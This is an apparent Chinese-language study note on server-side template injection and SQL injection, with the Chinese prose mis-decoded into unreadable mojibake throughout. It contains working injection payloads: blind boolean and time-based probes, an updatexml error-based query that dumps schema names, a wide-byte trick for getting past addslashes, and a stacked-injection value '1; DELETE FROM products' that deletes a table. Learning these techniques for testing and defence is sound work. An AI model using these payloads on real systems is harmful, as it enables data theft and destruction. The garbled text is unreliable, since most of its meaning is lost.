<p>SSTIåˆ©ç”¨çš„æ˜¯ç°æœ‰çš„ç½‘ç«™æ¨¡æ¿å¼•æ“ï¼Œä¸»è¦é’ˆå¯¹Pythonã€PHPã€JAVAçš„ä¸€äº›ç½‘ç«™å¤„ç†æ¡†æ¶ï¼Œæ¯”å¦‚Pythonçš„<strong>jinja2ã€makoã€tornadoã€Django</strong>ï¼ŒPHPçš„<strong>smarty twig</strong>ï¼Œjavaçš„<strong>jade velocity</strong>ã€‚å½“è¿™äº›æ¡†æ¶å¯¹è¿ç”¨æ¸²æŸ“å‡½æ•°ç”Ÿæˆhtmlçš„æ—¶å€™ï¼Œåœ¨è¿‡æ»¤ä¸ä¸¥æƒ…å†µä¸‹ï¼Œé€šè¿‡æ„é€ æ¶æ„è¾“å…¥æ•°æ®ï¼Œä»è€Œè¾¾åˆ°getshellæˆ–å…¶ä»–ç›®çš„ã€‚</p>
<blockquote>
<p><code>ä¸€å¥è¯å°±æ˜¯æœåŠ¡ç«¯åœ¨æ¥æ”¶ç”¨æˆ·è¾“å…¥æˆ–ç”¨æˆ·å¯æ§å‚æ•°åï¼Œæœªä½œå¤„ç†æˆ–æœªè¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œç›´æ¥åµŒå…¥æ¨¡æ¿æ¸²æŸ“ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç </code></p>
</blockquote>
<p><strong>æ¨¡æ¿æ³¨å…¥</strong>æ¶‰åŠçš„æ˜¯æœåŠ¡ç«¯Webåº”ç”¨ä½¿ç”¨æ¨¡æ¿å¼•æ“<strong>æ¸²æŸ“ç”¨æˆ·è¯·æ±‚çš„è¿‡ç¨‹</strong>ï¼Œ<br> æœåŠ¡ç«¯æŠŠ<strong>ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“æˆæ¨¡æ¿</strong>å°±å¯èƒ½é€ æˆSSTI(Server-Side Template Injection)</p>
<p>æ¨¡æ¿æ¸²æŸ“æ¥å—çš„å‚æ•°éœ€è¦ç”¨ä¸¤ä¸ªå¤§æ‹¬å·<code>&#123;  &#123;&#125;  &#125;</code>æ‹¬èµ·æ¥</p>
<h3 id="2-å±å®³-12"><a href="#2-å±å®³-12" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h3><p>æ”»å‡»è€…åœ¨æœåŠ¡å™¨è¾“å…¥è¯­å¥ï¼ŒæœåŠ¡ç«¯å°†å…¶<u><strong>ä½œä¸ºWebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†</strong></u>ï¼Œåœ¨è¿›è¡Œ<u><strong>ç›®æ ‡ç¼–è¯‘æ¸²æŸ“</strong></u>çš„è¿‡ç¨‹ä¸­ï¼Œ<u><strong>è¿›è¡Œäº†è¯­å¥çš„æ‹¼æ¥ï¼Œæ‰§è¡Œäº†æ‰€æ’å…¥çš„æ¶æ„å†…å®¹</strong></u>ï¼Œä»è€Œ<u><strong>å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShellç­‰</strong></u>é—®é¢˜</p>
<h3 id="3-é˜²å¾¡-12"><a href="#3-é˜²å¾¡-12" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h3><blockquote>
<p>1ï¼‰å’Œå…¶ä»–çš„æ³¨å…¥é˜²å¾¡ä¸€æ ·ï¼Œ<u><strong>ç»å¯¹ä¸è¦è®©ç”¨æˆ·å¯¹ä¼ å…¥æ¨¡æ¿çš„å†…å®¹æˆ–è€…æ¨¡æ¿æœ¬èº«è¿›è¡Œæ§åˆ¶</strong></u></p>
<p>2ï¼‰<u><strong>å‡å°‘æˆ–è€…æ”¾å¼ƒç›´æ¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆå­—ç¬¦ä¸²æ‹¼æ¥çš„æ¨¡æ¿æ¸²æŸ“</strong></u>æ–¹å¼ï¼Œ<u><strong>ä½¿ç”¨æ­£è§„çš„æ¨¡æ¿æ¸²æŸ“æ–¹æ³•</strong></u></p>
</blockquote>
<h1 id="æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰"><a href="#æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰" class="headerlink" title="æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰"></a>æ¼æ´çŸ¥è¯†ç‚¹è®°å½•ç¬”è®°ï¼ˆä¸€ï¼‰</h1><blockquote>
<p>è¡¥å……ä¸€äº›çŸ¥è¯†ç‚¹</p>
</blockquote>
<h2 id="ä¸€ã€sql"><a href="#ä¸€ã€sql" class="headerlink" title="ä¸€ã€sql"></a>ä¸€ã€sql</h2><h3 id="sqlæ³¨å…¥çš„åˆ†ç±»"><a href="#sqlæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="sqlæ³¨å…¥çš„åˆ†ç±»"></a>sqlæ³¨å…¥çš„åˆ†ç±»</h3><h4 id="1-æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š"><a href="#1-æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š" class="headerlink" title="1.æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š"></a>1.æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š</h4><p>â€ƒâ€ƒï¼ˆ1ï¼‰<code>GET</code> æ³¨å…¥ï¼šæäº¤æ•°æ®çš„æ–¹å¼æ˜¯ GET , æ³¨å…¥ç‚¹çš„ä½ç½®åœ¨ GET å‚æ•°éƒ¨åˆ†ã€‚æ¯”å¦‚æœ‰è¿™æ ·çš„ä¸€ä¸ªé“¾æ¥<code>http://xxx.com/news.php?id=1</code> , id æ˜¯æ³¨å…¥ç‚¹ã€‚</p>
<p>â€ƒâ€ƒï¼ˆ2ï¼‰<code>POST</code> æ³¨å…¥ï¼šä½¿ç”¨ POST æ–¹å¼æäº¤æ•°æ®ï¼Œæ³¨å…¥ç‚¹ä½ç½®åœ¨ POST æ•°æ®éƒ¨åˆ†ï¼Œå¸¸å‘ç”Ÿåœ¨è¡¨å•ä¸­(è¾“å…¥æ¡†)ã€‚</p>
<p>â€ƒâ€ƒï¼ˆ3ï¼‰<code>Cookie</code> æ³¨å…¥ï¼šHTTPè¯·æ±‚çš„æ—¶å€™ä¼šå¸¦ä¸Šå®¢æˆ·ç«¯çš„Cookie, æ³¨å…¥ç‚¹åœ¨Cookieå½“ä¸­çš„æŸä¸ªå­—æ®µä¸­ã€‚</p>
<p>â€ƒâ€ƒï¼ˆ4ï¼‰<code>HTTP</code> å¤´éƒ¨æ³¨å…¥ï¼šæ³¨å…¥ç‚¹åœ¨ HTTP è¯·æ±‚å¤´éƒ¨çš„æŸä¸ªå­—æ®µä¸­ã€‚æ¯”å¦‚å­˜åœ¨ User-Agent å­—æ®µä¸­ã€‚ä¸¥æ ¼è®²çš„è¯ï¼ŒCookie å…¶å®åº”è¯¥ä¹Ÿæ˜¯ç®—å¤´éƒ¨æ³¨å…¥çš„ä¸€ç§å½¢å¼ã€‚å› ä¸ºåœ¨ HTTP è¯·æ±‚çš„æ—¶å€™ï¼ŒCookie æ˜¯å¤´éƒ¨çš„ä¸€ä¸ªå­—æ®µã€‚</p>
<h4 id="2-æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š"><a href="#2-æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š" class="headerlink" title="2.æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š"></a>2.æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š</h4><h5 id="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨"><a href="#ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨" class="headerlink" title="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨"></a>ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨</h5><blockquote>
<p>boolç›²æ³¨ï¼Œå³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ã€‚</p>
<p>ä¸€èˆ¬æ ¹æ®æ•°æ®å­—ç¬¦asiicç å¤§å°æˆ–å­—ç¬¦é•¿çŸ­ï¼Œç”¨äºŒåˆ†æ³•è¿›è¡Œåˆ¤æ–­å­—ç¬¦ç­”æ¡ˆ</p>
<p>é•¿åº¦æ¯”å¦‚</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> length(database()) &gt; <span class="number">5</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ„æ€å°±æ˜¯åˆ¤æ–­æ•°æ®åº“åå¤§äº5ï¼Œå¦‚æœè¿”å›å‡å°±åœ¨å°äº5é‡Œæ‰¾ï¼Œå¦‚æœè¿”å›çœŸï¼Œå°±åœ¨å¤§äº5èŒƒå›´é‡Œæ‰¾ï¼ŒçŒœæµ‹åˆ°å¤§æ¦‚çš„é•¿åº¦çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨&#x3D;è¯•è¯•</p>
</blockquote>
<blockquote>
<p>å¯¹äºå•ä¸€å­—ç¬¦çŒœæµ‹ï¼Œå¯ä»¥åˆ©ç”¨å­—æ¯çš„<code>ascii</code>ç ï¼Œ</p>
</blockquote>
<p>æ¯”å¦‚</p>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>substræ˜¯æˆªå–å­—ç¬¦ï¼Œå¦‚ä¸Šå°±æ˜¯ä»ç¬¬ä¸€ä¸ªå­—ç¬¦æˆªå–ï¼Œæˆªå–ä¸€ä¸ªå­—ç¬¦<br>æ„æ€å°±æ˜¯åˆ¤æ–­æ•°æ®åº“åç¬¬ä¸€ä¸ªå­—æ¯çš„asciiç æ˜¯å¦å¤§äº110ï¼Œè¿”å›å‡å°±åœ¨å°äº110é‡Œæ‰¾ï¼Œè¿”å›çœŸï¼Œå°±åœ¨å¤§äº110é‡Œæ‰¾ï¼Œæœ€åå¯ä»¥ç”¨&#x3D;åŠ ä»¥ç¡®å®š</p>
</blockquote>
<p><code>å¯ä»¥ç”¨burpsuiteè¿›è¡Œpayloadçˆ†ç ´ï¼Œç”¨æ•°å­—å­—å…¸ï¼Œç›´æ¥ä»0-127ï¼ˆasciiç å…±127ä½ï¼‰ï¼Œç„¶åæ ¹æ®å›æ˜¾ï¼Œåˆ¤æ–­ï¼Œå°±ä¸ç”¨ä¸€ä¸ªä¸€ä¸ªæ…¢æ…¢å°è¯•</code></p>
<p><code>å¼ºçƒˆå»ºè®®å¯ä»¥å­¦ä¹ ä¸€ä¸‹pythonï¼Œè¿™æ ·å¯ä»¥è‡ªå·±é’ˆå¯¹æ€§çš„å†™ä¸€ä¸ªè„šæœ¬ï¼Œæ•ˆç‡æ›´é«˜</code></p>
<h5 id="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨"><a href="#ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨" class="headerlink" title="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨"></a>ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨</h5><blockquote>
<p>å³ä¸èƒ½æ ¹æ®é¡µé¢è¿”å›å†…å®¹åˆ¤æ–­ä»»ä½•ä¿¡æ¯ï¼Œç”¨æ¡ä»¶è¯­å¥ï¼ˆifï¼‰æŸ¥çœ‹æ—¶é—´å»¶è¿Ÿè¯­å¥ï¼ˆsleep()ï¼‰æ˜¯å¦æ‰§è¡Œï¼ˆå³é¡µé¢è¿”å›æ—¶é—´æ˜¯å¦å¢åŠ ï¼‰æ¥åˆ¤æ–­ã€‚</p>
</blockquote>
<figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="keyword">if</span>(length(database()&gt;<span class="number">7</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>è¿™é‡Œåˆ¤æ–­å¦‚æœæ•°æ®åº“åå¤§äº7ï¼Œå°±å»¶è¿Ÿç½‘é¡µ5sï¼Œåæ­£æ²¡æœ‰å»¶è¿Ÿã€å°±æ˜¯æ‰§è¡Œ1ã€‘ï¼Œå‰©ä¸‹çš„å’Œboolç›²æ³¨ä¸€æ ·ï¼ŒæŒ¨ä¸ªè¯•è¯•ï¼Œæ¨æµ‹å‡ºæ•°æ®åº“åå’Œå…¶ä»–æ•°æ®</p>
</blockquote>
<h6 id="æ—¶é—´ç›²æ³¨çš„å‡½æ•°æˆ–è€…æ–¹æ³•"><a href="#æ—¶é—´ç›²æ³¨çš„å‡½æ•°æˆ–è€…æ–¹æ³•" class="headerlink" title="æ—¶é—´ç›²æ³¨çš„å‡½æ•°æˆ–è€…æ–¹æ³•"></a>æ—¶é—´ç›²æ³¨çš„å‡½æ•°æˆ–è€…æ–¹æ³•</h6><blockquote>
<ul>
<li><p><strong>sleep()</strong></p>
</li>
<li><p>**benchmark ()**ï¼šæµ‹å®šæŸäº›ç‰¹å®šæ“ä½œçš„æ‰§è¡Œé€Ÿåº¦ï¼Œç»“æœå€¼æ€»æ˜¯0ï¼Œä»…ä»…ä¼šæ‰§è¡Œæ˜¾ç¤ºæ—¶é—´</p>
<blockquote>
<p>benchmark (count,expr)ï¼Œexprä¸ºæ‰§è¡Œè¡¨è¾¾å¼ï¼Œcountä¸ºæ‰§è¡Œæ¬¡æ•°</p>
<p>å¸¸ç”¨è¯­å¥</p>
<p>SELECT BENCHMARK(100000000,(select database()));</p>
</blockquote>
</li>
<li><p><strong>ç¬›å¡å°”ç§¯</strong>ï¼šé€šè¿‡åšå¤§é‡çš„æŸ¥è¯¢å¯¼è‡´æŸ¥è¯¢æ—¶é—´è¾ƒé•¿æ¥è¾¾åˆ°å»¶æ—¶çš„ç›®çš„ã€‚é€šå¸¸é€‰æ‹©ä¸€äº›æ¯”è¾ƒå¤§çš„è¡¨åšç¬›å¡å°”ç§¯è¿ç®—</p>
</li>
</ul>
</blockquote>
<h5 id="ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥"><a href="#ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥" class="headerlink" title="ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥"></a>ï¼ˆ3ï¼‰åŸºäºæŠ¥é”™æ³¨å…¥</h5><blockquote>
<p>å³é¡µé¢ä¼šè¿”å›é”™è¯¯ä¿¡æ¯ï¼Œæˆ–è€…æŠŠæ³¨å…¥çš„è¯­å¥çš„ç»“æœç›´æ¥è¿”å›åœ¨é¡µé¢ä¸­ã€‚å¦‚ï¼šå•å¼•å·ã€åŒå¼•å·ã€åŸºäºæ•°å­—å‹æ³¨å…¥ã€‚</p>
</blockquote>
<p>æ¯”å¦‚ï¼ŒæŸ¥è¯¢æ•°æ®åº“å</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(<span class="built_in">schema_name</span>) <span class="keyword">from</span> information_schema.schemata),<span class="number">0x7e</span>),<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>â€ƒ*<strong>æ³¨æ„</strong></p>
<blockquote>
<p>extractvalueå’Œupdatexmlåªæ˜¾ç¤º<code>32</code>ä½å­—ç¬¦</p>
<p>æ‰€ä»¥çˆ†å‡ºå­—ç¬¦ä¸å…¨æ—¶ï¼Œå¯ä»¥ç”¨<code>left(xxx,length)</code>å’Œ<code>right(xxx,length)</code><br>ã€æ³¨æ„0x7eä¹Ÿå°±æ˜¯<del>ä¹Ÿç®—å­—ç¬¦ä½ï¼ŒæŒ‰ä¸Šé¢ä¾‹å­ç”¨äº†ä¸¤ä¸ª</del>ï¼Œæ‰€ä»¥è¿™é‡Œæœ€å¤šåªèƒ½select 30ä¸ªå­—ç¬¦äº†ï¼Œä½†å·¦å³éƒ½30ï¼Œä¸€å…±å¯ä»¥select 60ä¸ªå­—ç¬¦ã€‘</p>
<p>æˆ–è€…ç”¨<code>substr(xxx,begin,length)</code>ï¼Œä»æ•°æ®çš„æŸä¸ªå¼€å§‹ã€è¿™é‡Œçš„å¼€å§‹ä½æ˜¯ä»1å¼€å§‹ï¼Œè€Œä¸æ˜¯0ã€‘æˆªå–ä¸€éƒ¨åˆ†æ˜¾ç¤º</p>
</blockquote>
<h5 id="ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥"><a href="#ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥" class="headerlink" title="ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥"></a>ï¼ˆ4ï¼‰è”åˆæŸ¥è¯¢æ³¨å…¥</h5><p>å¯ä»¥ä½¿ç”¨unionçš„æƒ…å†µä¸‹çš„æ³¨å…¥ã€‚</p>
<h5 id="ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰"><a href="#ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰" class="headerlink" title="ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰"></a>ï¼ˆ5ï¼‰å †æŸ¥è¯¢æ³¨å…¥ï¼ˆå †å æ³¨å…¥ï¼‰</h5><p>å¯ä»¥åŒæ—¶æ‰§è¡Œå¤šæ¡è¯­å¥çš„æ‰§è¡Œæ—¶çš„æ³¨å…¥ã€‚</p>
<h5 id="ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥"><a href="#ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥"></a>ï¼ˆ6ï¼‰å®½å­—èŠ‚æ³¨å…¥</h5><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œmysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ä¸€ä¸ª<a href="https://so.csdn.net/so/search?q=ASCII%E7%A0%81&spm=1001.2101.3001.7020">ASCIIç </a>è¦å¤§äº128ï¼Œæ‰åˆ°æ±‰å­—çš„èŒƒå›´ï¼‰ï¼Œç¤ºä¾‹å¦‚ä¸‹å›¾ï¼š</p>
<p><img src="/post/Web-study/image-20230806195837908.png" alt="image-20230806195837908"></p>
<p>MYSQLé»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ã€‚å¦‚ä¸Šå›¾æ‰€ç¤º%dfâ€™è¢«PHPè½¬ä¹‰ï¼Œå•å¼•å·è¢«åŠ ä¸Šåæ–œæ \ï¼Œå˜æˆäº†%dâ€™ï¼Œå…¶ä¸­\çš„åå…­è¿›åˆ¶æ˜¯%5Cï¼Œé‚£ä¹ˆç°åœ¨%dâ€™&#x3D;%d%5C%27,å¦‚æœç¨‹åºçš„é»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—èŠ‚å­—ç¬¦é›†ï¼ŒMYSQLç”¨GBKç¼–ç æ—¶ï¼Œä¼šè®¤ä¸º%df%5Cæ˜¯ä¸€ä¸ªå®½å­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯ç¸—ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š%df\â€™ &#x3D; %df%5c%27&#x3D;ç¸—â€™ï¼Œæœ‰äº†å•å¼•å·å°±å¯ä»¥æ³¨å…¥äº†</p>
<p>ç”¨æ¥ç»•è¿‡<strong>addslashes</strong></p>
<h4 id="â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š"><a href="#â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š" class="headerlink" title="â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š"></a>â‘¢æŒ‰ç…§æ³¨å…¥ç‚¹ç±»å‹æ¥åˆ†ç±»ï¼š</h4><p>â€ƒâ€ƒï¼ˆ1ï¼‰æ•°å­—å‹æ³¨å…¥ç‚¹ï¼šè®¸å¤šç½‘é¡µé“¾æ¥æœ‰ç±»ä¼¼çš„ç»“æ„ <code>http://xxx.com/users.php?id=1</code> åŸºäºæ­¤ç§å½¢å¼çš„æ³¨å…¥ï¼Œå…¶æ³¨å…¥ç‚¹ id ç±»å‹ä¸ºæ•°å­—è‹¥å­˜åœ¨æ³¨å…¥ç‚¹ï¼Œåˆ™å¯ä»¥åˆ©ç”¨ç½‘é¡µé€šè¿‡æ­¤ç§ç»“æ„ä¼ é€’idç­‰ä¿¡æ¯çš„åŸç†ï¼Œæ„é€ å‡ºç±»ä¼¼å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where id&#x3D;1 and 1&#x3D;1</p>
<p>â€ƒâ€ƒï¼ˆ2ï¼‰å­—ç¬¦å‹æ³¨å…¥ç‚¹ï¼šç½‘é¡µé“¾æ¥æœ‰ç±»ä¼¼çš„ç»“æ„ <code>http://xxx.com/users.php?name=admin</code> è¿™ç§å½¢å¼ï¼Œå…¶æ³¨å…¥ç‚¹ name ç±»å‹ä¸ºå­—ç¬¦ç±»å‹ï¼Œè‹¥å­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºç±»ä¼¼ä¸å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where name&#x3D;â€˜adminâ€™ and 1&#x3D;1 â€™</p>
<p>â€ƒâ€ƒï¼ˆ3ï¼‰æœç´¢å‹æ³¨å…¥ç‚¹ï¼šè¿™æ˜¯ä¸€ç±»ç‰¹æ®Šçš„æ³¨å…¥ç±»å‹ã€‚è¿™ç±»æ³¨å…¥ä¸»è¦æ˜¯æŒ‡åœ¨è¿›è¡Œæ•°æ®æœç´¢æ—¶æ²¡è¿‡æ»¤æœç´¢å‚æ•°ï¼Œä¸€èˆ¬åœ¨é“¾æ¥åœ°å€ä¸­æœ‰ â€œkeyword&#x3D;å…³é”®å­—â€ æœ‰çš„ä¸æ˜¾ç¤ºåœ¨çš„é“¾æ¥åœ°å€é‡Œé¢ï¼Œè€Œæ˜¯ç›´æ¥é€šè¿‡æœç´¢æ¡†è¡¨å•æäº¤ã€‚æ­¤ç±»æ³¨å…¥ç‚¹æäº¤çš„ SQL è¯­å¥ï¼Œå…¶åŸå½¢å¤§è‡´ä¸ºï¼šselect * from è¡¨å where å­—æ®µ like â€˜%å…³é”®å­—%â€™ è‹¥å­˜åœ¨æ³¨å…¥ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºç±»ä¼¼ä¸å¦‚ä¸‹çš„sqlæ³¨å…¥è¯­å¥è¿›è¡Œçˆ†ç ´ï¼šselect * from è¡¨å where å­—æ®µ like â€˜%æµ‹è¯•%â€™ and â€˜%1%â€™&#x3D;â€™%1%â€™</p>
<h4 id="â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“"><a href="#â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥-å“ªé‡Œå‘ç”Ÿäº†å½±å“" class="headerlink" title="â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)"></a>â‘£åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥(å“ªé‡Œå‘ç”Ÿäº†å½±å“)</h4><p><code>â˜…ä¸€é˜¶æ³¨å°„</code> </p>
<p><code>â˜…äºŒé˜¶æ³¨å°„</code> </p>
<blockquote>
<p>ä¸€é˜¶æ³¨å°„æ˜¯æŒ‡è¾“å…¥çš„æ³¨å°„è¯­å¥å¯¹ WEB ç›´æ¥äº§ç”Ÿäº†å½±å“ï¼Œå‡ºç°äº†ç»“æœï¼›</p>
<p>äºŒé˜¶æ³¨å…¥ç±»ä¼¼å­˜å‚¨å‹ XSSï¼Œæ˜¯æŒ‡è¾“å…¥æäº¤çš„è¯­å¥ï¼Œæ— æ³•ç›´æ¥å¯¹ WEB åº”ç”¨ç¨‹åºäº§ç”Ÿå½±å“ï¼Œé€šè¿‡å…¶å®ƒçš„è¾…åŠ©é—´æ¥çš„å¯¹ WEB äº§ç”Ÿå±å®³ï¼Œè¿™æ ·çš„å°±è¢«ç§°ä¸ºæ˜¯äºŒé˜¶æ³¨å…¥. </p>
</blockquote>
<h4 id="1-å †å æ³¨å…¥"><a href="#1-å †å æ³¨å…¥" class="headerlink" title="1.å †å æ³¨å…¥"></a>1.å †å æ³¨å…¥</h4><h5 id="1-å †å æ³¨å…¥å®šä¹‰"><a href="#1-å †å æ³¨å…¥å®šä¹‰" class="headerlink" title="1.å †å æ³¨å…¥å®šä¹‰"></a>1.å †å æ³¨å…¥å®šä¹‰</h5><blockquote>
<p>   Stacked  injections(å †å æ³¨å…¥)ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å † sql è¯­å¥(å¤šæ¡)ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå®çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„, æˆ‘ä»¬çŸ¥é“åœ¨  mysql ä¸­, ä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­, æ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åš stacked  injectionã€‚</p>
</blockquote>
<h5 id="2-å †å æ³¨å…¥åŸç†"><a href="#2-å †å æ³¨å…¥åŸç†" class="headerlink" title="2.å †å æ³¨å…¥åŸç†"></a>2.å †å æ³¨å…¥åŸç†</h5><p>   åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚<u>è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥</u>ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äº<u>union æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥</u>ï¼Œè€Œ<u>å †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥</u>ã€‚ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚ç”¨æˆ·è¾“å…¥ï¼š<code>1; DELETE FROM products</code>æœåŠ¡å™¨ç«¯ç”Ÿæˆçš„sqlè¯­å¥ä¸ºï¼š  <code>Select * from products where productid=1;DELETE FROM products</code>å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œ<u><strong>ç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯</strong></u>ï¼Œ<u><strong>ç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤</strong></u>ã€‚</p>
